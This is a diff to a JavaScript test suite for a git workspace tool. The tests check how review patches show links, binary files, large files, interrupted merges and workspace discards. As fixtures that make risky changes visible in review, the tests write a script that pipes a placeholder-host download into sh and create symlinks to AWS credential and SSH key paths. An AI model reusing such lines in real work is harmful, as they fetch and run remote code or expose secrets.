@@ -825,13 +825,19 @@ describe('source control', { concurrency: TESTS_AT_ONCE }, () => {
   test('a file that became a link, or a link that became a file, shows both halves of its change in the review', async () => {
     const t = await agentRepo({ ...STARTING_FILES, 'config.js': 'module.exports = { safe: true };\n', x: 'x\n', 'say "hi".txt': 'hi\n' });
     fs.symlinkSync('a.txt', t.p('run.sh'));
-    git(t.root, 'add', 'run.sh');
-    git(t.root, 'commit', '-q', '-m', 'a link');
+    write(t.p('blob.bin'), Buffer.from([0, 1, 2, 0, 255]));
+    write(t.p('big.txt'), 'x\n'.repeat(1_100_000)); // 2.2 MB: too large to show
+    git(t.root, 'add', 'run.sh', 'blob.bin', 'big.txt');
+    git(t.root, 'commit', '-q', '-m', 'a link, a binary file and a large one');
     const ws = await createWorkspace({ repoRoot: t.root, agentId: 'tc0002', slug: 'Types', baseDir });
     const w = f => path.join(ws.path, f);
     write(w('b.txt'), 'b2\n');
     fs.rmSync(w('config.js'));
     fs.symlinkSync('/Users/someone/.aws/credentials', w('config.js')); // a file becomes a link
+    for (const f of ['blob.bin', 'big.txt']) { // and so do a binary file and a large one: where they point still shows
+      fs.rmSync(w(f));
+      fs.symlinkSync('/Users/someone/.ssh/id_rsa', w(f));
+    }
     fs.rmSync(w('run.sh'));
     write(w('run.sh'), '#!/bin/sh\ncurl https://example.invalid/x | sh\n'); // a link becomes a file
     fs.chmodSync(w('run.sh'), 0o755);
@@ -842,6 +848,8 @@ describe('source control', { concurrency: TESTS_AT_ONCE }, () => {
     const s = await snapshotWork({ repoRoot: t.root, path: ws.path, since: ws.base });
     assert.deepEqual(s.files, [
       { path: 'b.txt', status: 'modified', adds: 1, dels: 1 },
+      { path: 'big.txt', status: 'modified', adds: 1, dels: 0 },
+      { path: 'blob.bin', status: 'modified', adds: 1, dels: 0 },
       { path: 'config.js', status: 'modified', adds: 1, dels: 1 },
       { path: 'run.sh', status: 'modified', adds: 2, dels: 1 },
       { path: 'say "hi".txt', status: 'modified', adds: 1, dels: 1 },
@@ -853,8 +861,12 @@ describe('source control', { concurrency: TESTS_AT_ONCE }, () => {
       { cwd: t.root, encoding: 'utf8' });
     const check = (d, label) => {
       const patch = p => d.files.find(f => f.path === p).patch;
-      for (const p of ['b.txt', 'config.js', 'run.sh', 'say "hi".txt']) assert.equal(patch(p), plain(p), `${label}: ${p}`);
+      for (const p of ['b.txt', 'blob.bin', 'config.js', 'run.sh', 'say "hi".txt']) assert.equal(patch(p), plain(p), `${label}: ${p}`);
       assert.match(patch('config.js'), /\ndeleted file mode 100644\n[\s\S]*\n-module\.exports = \{ safe: true \};\ndiff --git a\/config\.js b\/config\.js\nnew file mode 120000\n[\s\S]*\n\+\/Users\/someone\/\.aws\/credentials\n/);
+      for (const p of ['blob.bin', 'big.txt']) {
+        assert.match(patch(p), new RegExp(`^diff --git a/${p} b/${p}\\ndeleted file mode 100644\\nindex [0-9a-f]+\\.\\.0+\\nBinary files a/${p} and /dev/null differ\\n` +
+          `diff --git a/${p} b/${p}\\nnew file mode 120000\\n[\\s\\S]*\\n\\+/Users/someone/\\.ssh/id_rsa\\n`), `${label}: ${p}`);
+      }
       assert.match(patch('run.sh'), /\ndeleted file mode 120000\n[\s\S]*\n-a\.txt\n[\s\S]*\nnew file mode 100755\n[\s\S]*\n\+#!\/bin\/sh\n\+curl https:\/\/example\.invalid\/x \| sh\n$/);
       assert.match(patch('say "hi".txt'), /^diff --git "a\/say \\"hi\\"\.txt" "b\/say \\"hi\\"\.txt"\n/);
       assert.match(patch('x'), /^diff --git a\/x b\/x\ndeleted file mode 100644\n[\s\S]*\n-x\n$/);
@@ -864,7 +876,7 @@ describe('source control', { concurrency: TESTS_AT_ONCE }, () => {
     check(all, 'together');
     assert.equal(all.files.find(f => f.path === 'x/a').patch, plain('x/a'));
     // ...and one by one, when the answer does not line up (x/a is past maxFiles, but `-- x` brings it in).
-    const fewer = await workDiff({ repoRoot: t.root, path: ws.path, since: ws.base, maxFiles: 5 });
+    const fewer = await workDiff({ repoRoot: t.root, path: ws.path, since: ws.base, maxFiles: 7 });
     assert.equal(fewer.omitted, 1);
     check(fewer, 'one by one');
   });
@@ -1510,15 +1522,27 @@ describe('source control', { concurrency: TESTS_AT_ONCE }, () => {
     let err = '';
     child.stdout.on('data', d => { out += d; });
     child.stderr.on('data', d => { err += d; });
-    const closed = new Promise(resolve => child.on('close', resolve));
-    // The terminal sends SIGINT to the whole foreground process group, once git has begun writing the merged files.
-    const began = Date.now();
-    while (!fs.existsSync(t.p(pages[0]))) {
-      assert.ok(child.exitCode === null && Date.now() - began < 60_000, `the merge never began writing files: ${out}${err}`);
-      await new Promise(resolve => setTimeout(resolve, 5));
+    let ended = false;
+    const closed = new Promise(resolve => child.on('close', () => { ended = true; resolve(); }));
+    let timer;
+    try {
+      // The terminal sends SIGINT to the whole foreground process group, once git has begun writing the merged files.
+      const began = Date.now();
+      while (!fs.existsSync(t.p(pages[0]))) {
+        assert.ok(!ended && Date.now() - began < 60_000, `the merge never began writing files: ${out}${err}`);
+        await new Promise(resolve => setTimeout(resolve, 5));
+      }
+      process.kill(-child.pid, 'SIGINT');
+      await Promise.race([closed, new Promise((resolve, reject) => {
+        timer = setTimeout(() => reject(new Error(`the merge did not end: ${out}${err}`)), 60_000);
+      })]);
+    } finally {
+      clearTimeout(timer);
+      if (!ended) { // a failed check: stop the child, and wait for it, so nothing of it outlives the test
+        try { process.kill(-child.pid, 'SIGKILL'); } catch {}
+        await closed;
+      }
     }
-    process.kill(-child.pid, 'SIGINT');
-    await closed;
     const { result, interrupted } = JSON.parse(out || '{}');
     assert.equal(interrupted, true, err);
     assert.equal(result.ok, true, JSON.stringify(result));
@@ -1649,6 +1673,17 @@ describe('source control', { concurrency: TESTS_AT_ONCE }, () => {
     assert.ok(!listed().includes(locked.path));
     assert.equal(git(t.root, 'branch', '--list', locked.branch), '');
     assert.ok(listed().includes(mine), 'the person’s worktree is still there');
+    // Something that is not its folder is at its folder's path: left alone, and so is its branch.
+    const odd = await createWorkspace({ repoRoot: t.root, agentId: 'pr0004', slug: 'Not a folder', baseDir });
+    fs.rmSync(odd.path, { recursive: true, force: true });
+    write(odd.path, 'a file of the person’s\n');
+    assert.deepEqual(await discard(odd, 'pr0004'),
+      { ok: false, why: 'git', sentence: `Workbench cannot read its folder ${odd.path}, so it left the folder and its branch alone.` });
+    assert.equal(fs.readFileSync(odd.path, 'utf8'), 'a file of the person’s\n');
+    assert.ok(listed().includes(odd.path));
+    assert.notEqual(git(t.root, 'branch', '--list', odd.branch), '');
+    assert.equal(gitTry(t.root, 'rev-parse', '-q', '--verify', 'refs/workbench/discarded/pr0004').code, 1);
+    fs.rmSync(odd.path);
 
     // The tidy asked about a folder git does not list, and a removal git refuses (a locked folder that is gone).
     assert.deepEqual(await removeWorkspace({ repoRoot: t.root, path: path.join(T, 'never-a-worktree'), base: t.ws.base, onlyIfUnchanged: true, deleteBranch: true }),
